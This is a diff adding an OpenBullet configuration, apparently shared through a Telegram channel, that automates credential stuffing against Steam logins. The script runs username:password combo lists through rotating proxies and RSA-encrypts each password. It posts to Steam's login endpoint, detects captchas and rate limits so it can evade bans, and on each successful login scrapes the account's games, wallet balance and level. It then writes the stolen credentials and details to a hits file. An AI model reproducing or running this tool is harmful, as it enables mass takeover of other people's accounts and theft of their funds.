@@ -1,0 +1,145 @@
+[SETTINGS]
+{
+  "Name": "Steam",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-30T21:14:37.2813258+03:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Needs HQ Rotating Proxy | Combo Type: User:Pass | Capture Move 2FA (GUARD) To Custom | Save Hits Text File in OpenBullet Folder",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 4,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT Javascript
+Time = Date.now()
+END SCRIPT -> VARS "Time"
+
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#Lenght FUNCTION Length "donotcache=<Time>&username=<US>" -> VAR "Lenght" 
+
+#PostUser REQUEST POST "https://store.steampowered.com/login/getrsakey" 
+  CONTENT "donotcache=<Time>&username=<US>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fa,en;q=0.9,en-US;q=0.8" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: <Lenght>" 
+  HEADER "Host: store.steampowered.com" 
+  HEADER "Origin: https://store.steampowered.com" 
+  HEADER "Referer: https://store.steampowered.com/login/?redir=&redir_ssl=1" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+#K1 PARSE "<SOURCE>" LR "\"publickey_mod\":\"" "\"" -> VAR "K1" 
+
+#K2 PARSE "<SOURCE>" LR "\"publickey_exp\":\"" "\"" -> VAR "K2" 
+
+#Time2 PARSE "<SOURCE>" LR "\"timestamp\":\"" "\",\"" -> VAR "T2" 
+
+#RSA FUNCTION RSAPKCS1PAD2 "<K1>" "<K2>" "<PASS>" -> VAR "RSA" 
+
+#Pass_Encode FUNCTION URLEncode "<RSA>" -> VAR "url" 
+
+#Lenght2 FUNCTION Length "donotcache=<Time>&password=<url>&username=<US>&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=<T2>&remember_login=false" -> VAR "Lenght2" 
+
+#LastLogin REQUEST POST "https://store.steampowered.com/login/dologin/" 
+  CONTENT "donotcache=<Time>&password=<url>&username=<US>&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=<T2>&remember_login=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fa,en;q=0.9,en-US;q=0.8" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: <Lenght2>" 
+  HEADER "Host: store.steampowered.com" 
+  HEADER "Origin: https://store.steampowered.com" 
+  HEADER "Referer: https://store.steampowered.com/login/?redir=&redir_ssl=1" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"The account name or password that you have entered is incorrect.\"," 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true," 
+  KEYCHAIN Ban OR 
+    KEY "\"Please verify your humanity by re-entering the characters in the captcha.\"" 
+    KEY "\"captcha_needed\":true," 
+    KEY "\"There have been too many login failures from your network in a short time period. Please wait and try again later.\"," 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\",\"emailauth_needed\":true," 
+
+#ID PARSE "<SOURCE>" JSON "steamid" -> VAR "ID" 
+
+#Get_Cap REQUEST GET "https://steamcommunity.com/profiles/<ID>/games/?tab=all" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#G_Kol PARSE "<SOURCE>" LR "<script language=\"javascript\">" "}}];" -> VAR "KOL" 
+
+#GGG PARSE "<KOL>" LR "\"name\":\"" "\"," Recursive=TRUE -> VAR "GGG" 
+
+#GamesList FUNCTION Replace "," " / " "<GGG>" -> CAP "Games List" 
+
+#GamesList FUNCTION Replace "," "\\n" "<GGG>" -> VAR "Games Lis" 
+
+#Get_Balance REQUEST GET "https://store.steampowered.com/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#BBB PARSE "<SOURCE>" LR "<div class=\"accountRow accountBalance\">" "<div class=\"inner_rule\"></div>" -> VAR "BBB" 
+
+#Balance PARSE "<BBB>" LR "<div class=\"accountData price\">" "</div>" CreateEmpty=FALSE -> CAP "Balance" 
+
+#Balance2 PARSE "<BBB>" LR "ref=\"https://store.steampowered.com/account/history/\">" "</a></div>" CreateEmpty=FALSE -> CAP "Balance2" 
+
+#Last_Online REQUEST GET "https://steamcommunity.com/profiles/<ID>/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Last_Online PARSE "<SOURCE>" LR "<div class=\"profile_in_game_name\">" "</div>" Recursive=TRUE CreateEmpty=FALSE -> CAP "Last Online" 
+
+#Level PARSE "<SOURCE>" LR "<div class=\"friendPlayerLevel lvl_0\"><span class=\"friendPlayerLevelNum\">" "</span></div></div>" CreateEmpty=FALSE -> CAP "Level" 
+
+#CC FUNCTION Constant "T.me/BruteForce " -> CAP " Telegram Channel: " 
+
+#Saves UTILITY File "STEAM HITS .txt" AppendLines "<<<<<<<<=Account=>>>>>>>>\\nAccount: <USER>:<PASS>\\nUSER: <USER>\\nPASS: <PASS>\\n\\n<<<<<<<<=Account INFO=>>>>>>>>\\nGames:\\n<Games Lis>\\n\\nBalance: <Balance>\\nBalance2: <Balance2>\\nLast Online: <Last Online>\\nLevel: <Level>\\n\\n\\nConfiged By: T.me/TheOwn\\nJoin Telegram Channel: T.me/BruteForce\\n========================<<=END=>>=======================\\n\\n\\n" -> VAR "Save" 
+
